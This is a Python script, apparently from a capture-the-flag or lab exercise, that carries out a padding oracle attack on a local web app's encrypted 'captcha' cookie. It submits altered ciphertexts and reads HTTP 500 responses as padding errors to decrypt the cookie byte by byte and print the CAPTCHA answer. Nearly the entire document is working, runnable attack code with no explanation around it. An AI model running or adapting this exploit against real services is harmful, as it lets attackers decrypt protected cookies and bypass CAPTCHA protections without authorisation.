import requests
import base64
import time

BASE_URL = "http://127.0.0.1:32834"
COOKIE_VALUE = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="
BLOCK_SIZE = 16

session = requests.Session()

# Get CSRF token
response = session.get(BASE_URL)
import re
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', response.text)
csrf_token = csrf_match.group(1) if csrf_match else ""
print(f"[+] CSRF token: {csrf_token}")

# Decode cookie
ciphertext = base64.b64decode(COOKIE_VALUE)
blocks = [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]
print(f"[+] Cookie has {len(blocks)} blocks")

def oracle(ciphertext_to_test):
    """Padding oracle - returns True if padding is valid"""
    test_cookie = base64.b64encode(ciphertext_to_test).decode()
    
    try:
        response = session.post(BASE_URL, data={
            'csrf_token': csrf_token,
            'username': 'test',
            'captcha': 'test',
            'submit': 'Submit'
        }, cookies={'captcha': test_cookie}, timeout=5)
        
        # Valid padding gives 403/200, invalid padding gives 500
        print(f"       Oracle check - Status: {response.status_code} | Length: {len(response.text)}")
        
        if response.status_code == 500:
            return False  # Invalid padding
        else:
            return True   # Valid padding (403 or 200)
    except Exception as e:
        print(f"       Error: {e}")
        return False

def decrypt_block(block_num):
    """Decrypt a specific block using padding oracle"""
    if block_num == 0:
        return b''  # IV block, not encrypted data
    
    print(f"\n{'='*60}")
    print(f"[*] Decrypting block {block_num}")
    print(f"{'='*60}")
    
    # Previous block (acts as IV)
    prev_block = bytearray(blocks[block_num - 1])
    target_block = blocks[block_num]
    
    decrypted = bytearray(BLOCK_SIZE)
    
    # Work backwards from last byte
    for pad_len in range(1, BLOCK_SIZE + 1):
        byte_pos = BLOCK_SIZE - pad_len
        print(f"\n[*] Position {byte_pos}, padding value: {pad_len}")
        
        found = False
        
        # Try all possible byte values
        for guess in range(256):
            # Prepare test block
            test_block = bytearray(prev_block)
            
            # Set the byte we're testing
            test_block[byte_pos] = guess
            
            # Set padding for already decrypted bytes
            for i in range(BLOCK_SIZE - 1, byte_pos, -1):
                test_block[i] = decrypted[i] ^ pad_len ^ prev_block[i]
            
            # Test with oracle
            test_ciphertext = bytes(test_block) + target_block
            
            # Progress indicator
            if guess % 16 == 0:
                print(f"  Trying: {guess}/256", end='\r')
            
            # Check oracle
            if oracle(test_ciphertext):
                # Found correct padding!
                decrypted_byte = guess ^ pad_len ^ prev_block[byte_pos]
                print(f"\n  [+] Found: {decrypted_byte:02x} ({chr(decrypted_byte) if 32 <= decrypted_byte <= 126 else '.'})")
                decrypted[byte_pos] = decrypted_byte
                found = True
                break
        
        if not found:
            print(f"\n  [-] Warning: Could not find byte at position {byte_pos}")
            decrypted[byte_pos] = 0
    
    return bytes(decrypted)

# Decrypt all blocks (skip block 0 which is IV)
print(f"\n[*] Starting padding oracle attack...")
print(f"[*] This will take several minutes...")

full_decrypted = b''
for i in range(1, len(blocks)):
    decrypted_block = decrypt_block(i)
    full_decrypted += decrypted_block
    print(f"\n[+] Block {i} decrypted: {decrypted_block.hex()}")
    try:
        text = decrypted_block.decode('utf-8', errors='ignore')
        print(f"[+] Block {i} text: {text}")
    except:
        pass

# Handle padding
print(f"\n{'='*60}")
print(f"[*] Decrypted data (hex): {full_decrypted.hex()}")

# Remove PKCS7 padding
if len(full_decrypted) > 0:
    pad_len = full_decrypted[-1]
    if 1 <= pad_len <= BLOCK_SIZE:
        # Check padding validity
        valid_padding = True
        for i in range(1, pad_len + 1):
            if full_decrypted[-i] != pad_len:
                valid_padding = False
                break
        
        if valid_padding:
            unpadded = full_decrypted[:-pad_len]
            print(f"[+] Unpadded data: {unpadded.hex()}")
            
            print(f"\n{'='*60}")
            print(f"[*] CAPTCHA SOLUTION: '{unpadded.decode('utf-8', errors='ignore')}'")
            print(f"{'='*60}")
        else:
            print(f"[-] Invalid padding detected")
            print(f"[*] Raw data: {full_decrypted}")
    else:
        print(f"[*] No valid padding found")
        print(f"[*] Raw data: {full_decrypted}")

print(f"\n[+] Attack completed!")
